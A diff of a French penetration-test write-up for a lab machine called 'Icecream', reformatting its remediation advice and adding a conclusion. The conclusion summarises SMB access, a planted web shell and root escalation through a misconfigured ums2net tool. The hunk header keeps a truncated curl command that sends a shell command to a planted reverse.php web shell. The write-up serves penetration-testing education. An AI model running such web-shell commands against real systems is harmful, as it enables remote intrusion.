@@ -368,10 +368,34 @@ curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=ba
 
 Pour remédier aux vulnérabilités identifiées et améliorer la sécurité générale du système, les actions suivantes sont recommandées :
 
-1. **Mise à jour immédiate de WordPress et de tous les plugins et thèmes** : C'est la mesure la plus efficace pour corriger les failles de sécurité connues.
-2. **Restriction de l'accès au SSH** : Limiter les accès SSH aux adresses IP de confiance et utiliser l'authentification par clé plutôt que par mot de passe.
-3. **Désactivation des plugins inutilisés** : Les plugins qui ne sont pas nécessaires doivent être désactivés pour réduire la surface d'attaque.
-4. **Mise en place d'un pare-feu d'applications web (WAF)** : Un WAF peut aider à bloquer les tentatives d'attaques XSS, d'injection SQL, et d'autres attaques web courantes.
-5. **Audits de sécurité réguliers** : Des audits réguliers et des tests de pénétration peuvent aider à identifier et corriger les nouvelles vulnérabilités avant qu'elles ne soient exploitées.
+Mise à jour immédiate de WordPress et de tous les plugins et thèmes : C'est la mesure la plus efficace pour corriger les failles de sécurité connues.
+
+Restriction de l'accès au SSH : Limiter les accès SSH aux adresses IP de confiance et utiliser l'authentification par clé plutôt que par mot de passe.
+
+Désactivation des plugins inutilisés : Les plugins qui ne sont pas nécessaires doivent être désactivés pour réduire la surface d'attaque.
+
+Mise en place d'un pare-feu d'applications web (WAF) : Un WAF peut aider à bloquer les tentatives d'attaques XSS, d'injection SQL, et d'autres attaques web courantes.
+
+Audits de sécurité réguliers : Des audits réguliers et des tests de pénétration peuvent aider à identifier et corriger les nouvelles vulnérabilités avant qu'elles ne soient exploitées.
 
 Ces mesures, combinées à une vigilance continue et à des pratiques de sécurité informatique robustes, peuvent aider à sécuriser significativement le système contre les attaques futures.
+
+## 8. Conclusion
+
+Au cours de ce test d’intrusion, nous avons identifié et exploité plusieurs failles de sécurité dans la machine **Icecream**. En résumé, nous avons pu :
+
+1. Découvrir et explorer des services ouverts, notamment via SMB.
+2. Obtenir un accès initial en utilisant les partages SMB avec des droits en écriture.
+3. Déployer un Web Shell pour exécuter des commandes à distance.
+4. Élever nos privilèges jusqu’au compte root en exploitant une mauvaise configuration de l’outil **ums2net**.
+
+Ces failles démontrent l’importance de maintenir une infrastructure correctement sécurisée. À chaque étape, des correctifs et des recommandations ont été proposés pour limiter les risques futurs.
+
+**Points essentiels pour l’entreprise :**
+- Supprimer ou sécuriser les services inutilisés.
+- Réviser les permissions sur les fichiers critiques.
+- Mettre à jour régulièrement les outils et dépendances.
+- Implémenter des pratiques de surveillance et de gestion des journaux.
+
+**Prochaine étape :** appliquer les correctifs proposés et effectuer des audits de sécurité réguliers afin de prévenir de futures compromissions.
+
